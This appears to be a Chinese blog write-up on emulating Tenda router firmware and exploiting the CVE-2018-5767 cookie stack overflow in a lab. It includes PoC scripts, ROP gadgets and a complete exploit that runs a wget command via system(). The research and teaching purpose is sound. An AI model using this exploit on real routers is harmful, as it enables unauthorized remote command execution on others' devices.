@@ -1,0 +1,122 @@
+# 某路由器固件模拟分析及栈溢出漏洞分析
+## 1.概述
+分析了一部分tenda的漏洞，发现存在一系列相似的栈溢出的漏洞，如CVE-2018-5767、CVE-2018-18708、CVE-2018-16333以及CVE-2020-13392等。这些漏洞的固件模拟流程是一致的，有很多博客介绍了如何修复固件的网络环境，但并没有分析这样的做的原因，很多复现博客也是知其然而不知所以然，所以本文着重介绍了通过逆向分析修复网络环境的步骤。最后，以其中一个漏洞CVE-2018-5767为例，介绍了漏洞利用的过程。
+## 2.固件模拟
+固件下载：IOT-vulhub：
+### 提取固件并运行httpd可执行文件
+    binwalk -Me 固件
+    cd squashroot
+    cp $(which qemu-arm-static) ./
+    sudo chroot . ./qemu-arm-static ./bin/httpd        # 运行
+卡在启动界面，IDA分析原因，根据字符串”Welcome to ...“来到main函数  
+发现存在两个检查，第一个检查network，未通过则进入休眠阶段。第二个检查连接情况，未通过则打印连接失败  
+所以想让服务正常启动，需要对这两处检查进行patch，这里推荐一个IDA插件：keypatch，  
+具体patch过程如下：  
+#### 分析并修复网络环境
+patch完继续执行二进制文件，发现ip地址不对  
+进一步IDA查看ip地址如何得到的，通过字符串“listen ip”定位到sub_1A36C函数  
+下断点，gdb分析sub_1A36C函数的调用链
+    #qemu启动httpd程序目，并开启调试端口
+        sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd
+        #另起终端，gdb-mul连接
+        gdb-multiarch 
+        set architecture arm
+        b *0x1A36C
+        target remote :1234
+bt（backtrace）查看函数sub_1A36C的调用栈，结合IDA可以确定sub_28338调用了sub_1A36C  
+继续分析sub_28338的调用关系，分析得知sub_28030调用了sub_28338，gdb命令bt得到的函数调用信息并不完整，需要结合IDA进一步分析
+重复上面的步骤，可以得到具体的调用链为：sub_2CEA8（main函数）-> sub_2D3F0(initWebs函数) -> sub_28030 ->
+sub_28338 -> sub_1A36C
+接下来分析printf的ip参数v8进行跟踪：v8关联到s.sa_data[2]，s.sa_data[2]关联到a1，a2
+a1关联到g_lan_ip函数，最终回溯到主函数中
+可以看到ip的值与s和v17有关
+此处我们进行详细分析，根据函数名猜测getIfIp的作用的是获取ip地址，进入函数查看具体实现。
+getIfIp为外部导入函数，对函数名进行搜索，查找存在的动态链接库
+    #查看可执行程序需要的动态链接库
+      readelf -d ./bin/httpd | grep NEEDED
+      #列出所有的函数名，与要寻找的函数对比
+      nm -D ./lib/libcommon.so
+发现getIfIp函数的本体存在于libcommon.so 中
+大致分析伪代码，可以看到一个系统调用ioctl(fd, 0x8915u, dest)，查看这个系统调用所实现的功能
+一般来讲ioctl在用户程序中的调用是：
+ioctl(int fd,int command, (char*)argstruct)
+ioctl调用与网络编程有关，文件描述符fd实际上是由socket()系统调用返回的。参数command的取值由/usr/include/linux/sockios.h
+所规定。第三个参数是ifreq结构，在/usr/include/linux/if.h中定义。
+参考：
+到头文件中查看，可以发现，第二个参数实现的功能正是获取IP地址
+第三个参数的含义需要进一步分析，先看函数整体的流程，应该就是成功获取ip地址返回v2，v2的值为0的话，在main函数中的判断就不会进入if循环，而ip地址的值则由v17决定。进一步跟进v17，就是在getIfIp函数中的a2，由系统调用获取ip地址后赋给a2即main函数中的v17。那么想让函数按我们分析的执行，还需要分析第三个参数的含义。第三个参数与main函数的v6有关，进一步分析，与getLanIfName函数有关，依照上面的步骤发现getLanIfName函数依然存在于libcommon.so中，查看函数的本体。
+getLanIfName函数进一步关联到get_eth_name函数，且参数写死为0。依照上面的步骤发现get_eth_name函数依然存在于libChipApi.so中，查看函数的本体，函数返回v1，即网卡的名称，上述系统调用的第三个参数也就清楚了。
+至此，我们可以梳理一下整个流程。在main函数中，首先调用getLanIfName函数进而调用get_eth_name函数获取网卡名称。然后将网卡名称作为参数输入到getIfIp中，函数功能为寻找网卡名称为br0的ip地址并传递给V17。
+所以，想让二进制程序监听正确的ip地址需要新建一个名为br0的网卡。
+    sudo brctl addbr br0
+       sudo ifconfig br0 192.168.2.3/24
+重新启动，找到了名为br0的网卡并获取了ip地址：
+尝试访问web页面，还是存在错误：
+按照0431师傅的做法：cp -rf ./webroot_ro/* ./webroot/，然后刷新一下就正常了
+到这环境就搭建好了，这也是tenda一系列漏洞的环境模拟过程。
+## 3.漏洞分析
+接下来以CVE-2018-5767为例，介绍这类漏洞的利用过程。根据CVE的描述以及公开POC的信息，得知溢出点在R7WebsSecurityHandler函数中。IDA查看漏洞点的代码。
+漏洞成因为：没有限制用户输入的cookie的长度，sscanf在解析参数时没有限制参数的长度，导致栈溢出。
+输入的URL要保证if语句不会为false，/goform/xxx就可以。
+写一个poc进行测试：
+    import requests
+     url = "http://192.168.2.3/goform/xxx"
+     cookie = {"Cookie":"password="+"A"*1000}
+     requests.get(url=url, cookies=cookie)
+qemu-user模拟启动程序进行gdb调试
+    #qemu-user启动程序
+      sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd
+      #另起终端，gdb远程调试
+      gdb-multarch ./bin/httpd
+      target remote :1234
+      #另起终端，运行poc
+      python poc.py
+可以看出，栈溢出导致寄存器中写入了我们填充的字符串，但是并没有覆盖函数返回地址，是从r3取值，并跳转导致的错误。
+gdb查看调用路径，跟踪发现触发错误的地方位于sub_2C568函数中，跳出这个函数才可以实现缓冲区溢出。
+查看漏洞点所在的函数，可以发现存在一个绕过这个子函数的地方，只要判断不为真。这段代码寻找“.”号的地址，并通过memcmp函数判断是否为“gif、png、js、css、jpg、jpeg”字符串。比如存在“.png”内容时，memcmp(v44,
+"png", 3u)的返回值为0，if语句将失败。
+所以新的poc为：
+    import requests
+    url = "http://192.168.2.3/goform/xxx"
+    cookie = {"Cookie":"password="+"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"+ ".png"}
+    requests.get(url=url, cookies=cookie)
+可以看到覆盖了返回地址
+根据cyclic可以确定偏移量为448。
+## 4.漏洞利用
+通过checksec检查http程序，发现开启了NX保护，所以无法直接在栈上执行shellcode，所以寻找gadgets来构造rop链。
+利用思路：需要找到system函数地址，并将system函数地址存入某个寄存器，将system函数参数传入R0寄存器，并跳转到system函数地址所在的寄存器。
+首先，确定system函数的地址需要先找到libc的基址，根据偏移再计算出system函数的真实地址。qemu-user模拟不支持vmmap指令打印内存信息，官方给出了说明：  
+所以我们使用puts函数泄露libc地址，gdb调试下断点到puts函数，可以看到地址为0xff60acd4，在IDA中查看system函数的地址为0x35cd4，得到偏移量为：0xff60acd4
+- 0x35cd4 = 0xff5d5000.而且需要说明的一点是，每次调试libc的基地址都是相同的，这是因为gdb调试的默认关闭了ASLR。
+其次，需要找到一个可以控制R0的gadget
+    #gadget2
+     sudo pip3 install ropgadget
+     ROPgadget --binary ./lib/libc.so.0  | grep "mov r0, sp"
+     0x00040cb8 : mov r0, sp ; blx r3
+可以看到，在控制R0之后，这条指令跳转到R3，因此，我们可以再找一条控制R3的gadget
+    #gadget1
+     ROPgadget --binary ./lib/libc.so.0 --only "pop"| grep r3
+     0x00018298 : pop {r3, pc}
+这样就组成了payload：padding + gadget1 + system_addr + gadget2 + cmd
+padding将函数溢出后覆盖返回地址为gadget1，gadget1将system_addr弹出到R3，将gadget2的地址弹出到pc执行gadget2，gadget2将此时栈顶的cmd参数弹出到R0，接着跳转到R3执行system函数。
+exp如下：
+    import requests
+     from pwn import *
+     cmd="wget 192.168.174.136"
+     libc_base = 0xff5d5000
+     system_offset = 0x0005a270
+     system_addr = libc_base + system_offset
+     gadget1 = libc_base + 0x00018298
+     gadget2 = libc_base + 0x00040cb8
+     payload = "A"*444 +".png" + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
+     url = "http://192.168.2.3/goform/xxx"
+     cookie = {"Cookie":"password="+ payload}
+     requests.get(url=url, cookies=cookie)
+可能是qemu-user模拟的原因，直接启动的话无法看到system函数的执行， **需要加上-strace才能看到被执行！**
+## 5.总结
+本文重点分析了模拟环境时的patch过程，以及如何逆向分析网络问题。针对tenda路由器模拟的一个共性问题：需要新建一个br0网卡，进行了逆向分析找到了原因，对路由器网络服务启动的流程有了一个更清晰的认识。
+另外，对qemu-user +
+gdb调试的方式有了更深体会。相比于系统模拟，用户模拟启动更快速更方便，不需要配置qemu虚拟机和宿主机的网络连接。但是会存在一些不能查看内存信息，执行命令不能显示等奇奇怪怪的问题。总的来说，两种方式各有优劣，在之后的调试过程中可以按需选择。
+如有不足之处，欢迎各位师傅帮忙指正！
+## 6.参考链接
+[https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&gid=1&pid=12](https://wzt.ac.cn/2019/03/19/CVE-2018-5767/#&gid=1&pid=12)
